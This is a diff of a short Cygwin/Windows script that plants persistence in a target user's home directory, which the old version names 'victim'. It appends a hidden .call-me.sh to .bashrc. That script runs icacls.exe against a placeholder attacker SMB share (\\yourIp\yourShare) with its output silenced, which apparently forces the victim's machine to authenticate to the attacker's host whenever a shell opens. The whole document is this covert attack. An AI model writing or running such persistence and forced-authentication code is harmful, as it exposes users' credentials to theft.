@@ -1,6 +1,7 @@
-cd ..\..\Cygwin64\home\victim
-echo ./.call-me.sh >> .bashrc
-echo icacls.exe "\\yourIp\yourShare\" >> .call-me.sh
-
+C:\cygwin64\Cygwin.bat
+cd
+echo "./.call-me.sh" >> .bashrc
+echo "icacls.exe \"\\\\\\\\yourIp\\\\yourShare\\\\\" > /dev/null 2>&1" >> .call-me.sh
 chmod u+x .call-me.sh
+exit
 exit
